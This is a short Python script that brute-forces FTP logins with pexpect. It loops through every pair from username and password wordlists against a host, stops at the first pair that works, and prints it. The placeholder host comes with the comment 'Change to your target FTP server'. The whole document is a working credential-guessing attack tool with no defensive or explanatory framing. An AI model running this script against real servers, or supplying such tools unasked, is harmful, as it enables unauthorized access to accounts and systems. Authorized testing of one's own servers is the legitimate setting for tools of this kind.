import pexpect

# Function to attempt login
def ftp_brute_force(host, username, password):
    try:
        # Start FTP session
        ftp_session = pexpect.spawn(f'ftp {host}')
        
        # Expect username prompt and send username
        ftp_session.expect('Name .*: ')
        ftp_session.sendline(username)
        
        # Expect password prompt and send password
        ftp_session.expect('Password:')
        ftp_session.sendline(password)
        
        # Check for successful login
        login_response = ftp_session.expect(['Login failed', 'ftp> '])
        # print(ftp_session)
        
        if login_response == 1:
            print(f'Successful login: {username}:{password}')
            ftp_session.sendline('bye')  # Logout
            return True
        else:
            return False
    except Exception as e:
        print(f'Error: {e}')
        return False

# Host IP or domain
ftp_host = '127.0.0.1'  # Change to your target FTP server

# Load usernames and passwords from files
with open('username.txt', 'r') as user_file:
    usernames = [line.strip() for line in user_file.readlines()]

with open('passwords.txt', 'r') as pass_file:
    passwords = [line.strip() for line in pass_file.readlines()]

# Iterate through each username and password combination
for username in usernames:
    for password in passwords:
        if ftp_brute_force(ftp_host, username, password):
            print(f'Credentials found: {username}:{password}')
            break  # Exit loop if successful login is found
        else:
            print('Login Failed!')
    else:
        continue  # Continue to next username if no password worked
    break  # Break outer loop if successful login is found
